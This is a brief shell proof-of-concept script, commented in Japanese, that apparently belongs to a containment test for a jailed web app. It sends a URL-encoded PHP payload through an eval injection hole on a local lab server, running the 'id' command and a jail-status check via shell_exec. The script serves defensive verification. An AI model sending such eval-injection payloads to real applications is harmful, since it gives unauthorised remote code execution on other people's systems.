#!/bin/sh
# PoC: 脆弱なアプリの eval 穴から、スロット内でコマンドを実行する。
# 攻撃が「成功する」こと自体は前提（アプリ乗っ取り済み）。ここでは
# 実行できた証拠を出し、封じ込めの確認は verify.sh が行う。
set -eu
BASE=${BASE:-http://127.0.0.1:8080}
MEMO=22222222-2222-4222-8222-222222222222
PAYLOAD='echo "PWNED\n"; echo shell_exec("/usr/bin/id"); echo shell_exec("sysctl -n security.jail.jailed");'
ENC=$(python3 -c 'import sys, urllib.parse; print(urllib.parse.quote(sys.argv[1], safe=""))' "$PAYLOAD")
curl -s -H 'Cookie: box_session=stage0-demo-session' -H 'Sec-Fetch-User: ?1' \
    "$BASE/memos/$MEMO?x=$ENC"
